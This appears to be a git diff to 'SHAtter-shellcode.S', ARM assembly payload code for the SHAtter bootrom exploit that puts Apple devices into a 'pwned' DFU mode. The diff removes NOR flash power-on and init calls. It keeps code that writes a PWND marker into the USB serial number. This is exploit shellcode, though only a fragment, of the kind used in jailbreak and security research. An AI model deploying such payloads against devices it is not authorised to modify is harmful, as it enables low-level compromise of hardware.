@@ -1,0 +1,30 @@
+diff --git a/src/SHAtter-shellcode.S b/src/SHAtter-shellcode.S
+index eb02a93..2608f34 100644
+--- a/src/SHAtter-shellcode.S
++++ b/src/SHAtter-shellcode.S
+@@ -15,8 +15,6 @@
+ .set image3_load_fail,                  0x47db
+ .set usb_wait_for_image,                0x4c85
+ .set jump_to,                           0x5a5d
+-.set nor_power_on,                      0x4e8d
+-.set nor_init,                          0x690d
+ .set memmove,                           0x84dc
+ .set strlcat,                           0x90c9
+ .set invalidate_instruction_cache,      0x6480
+@@ -79,16 +77,6 @@ pwned_dfu_start:
+     SUB R0, R0, #12
+     MOV SP, R0                                  @ SP = MAIN_STACK_ADDRESS - 12
+ 
+-    MOV R0, #1
+-    MOV R1, #1
+-    MOV R2, #0
+-    LDR R3, =nor_power_on
+-    BLX R3                                      @ nor_power_on(1, 1, 0)
+-
+-    MOV R0, #0
+-    LDR R3, =nor_init
+-    BLX R3                                      @ nor_init(0)
+-
+     LDR R0, =gUSBSerialNumber
+     ADR R1, PWND_STRING
+     MOV R2, #120
